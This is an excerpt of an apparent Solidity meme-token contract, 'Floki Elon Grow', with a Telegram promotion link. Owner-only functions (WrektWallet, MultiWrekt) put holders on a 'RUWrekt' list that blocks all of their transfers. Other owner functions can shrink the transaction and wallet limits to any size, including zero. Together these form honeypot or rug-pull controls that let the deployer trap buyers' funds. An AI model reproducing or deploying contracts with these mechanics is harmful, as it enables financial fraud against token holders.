...
//Telegram: https://t.me/flokielongrow1000x
...
contract FLOKIELONGROW is Context, IERC20, Ownable {
    ...
    mapping (address => bool) public RUWrekt;
    ...
    uint256 public swapTokensAtAmount = 2000 * 10**_decimals;
    uint256 public maxTxAmount = _tTotal;
    uint256 public maxWalletAmount = 20000 * 10**_decimals;

    address public constant deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public marketingWallet = 0x0000f60f9A03aE6bCb1F1175964FABAA61971951;

    string private constant _name = "Floki Elon Grow";
    string private constant _symbol = "FLOKIELONGROW";
    ...
    Taxes public taxes = Taxes(4,6,2,0);
    ...
    function WrektWallet(address account, bool TorF) public onlyOwner {
        RUWrekt[account] = TorF;
    }

    function MultiWrekt(address[] memory account, bool TorF) public onlyOwner {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        require(!RUWrekt[to] && !RUWrekt[from], "Sorry, You can't transfer your token!");
    ...
    function updateMaxTxAmount(uint256 percentage) external onlyOwner{
        maxTxAmount = (_tTotal * percentage) / 1000;
    }

    function updateMaxWalletBalance(uint256 percentage) external onlyOwner{
        maxWalletAmount = (_tTotal * percentage) / 1000;
    }

    function updateSwapTokensAtAmount(uint256 percentage) external onlyOwner{
        swapTokensAtAmount = (_tTotal * percentage) / 1000;
    }
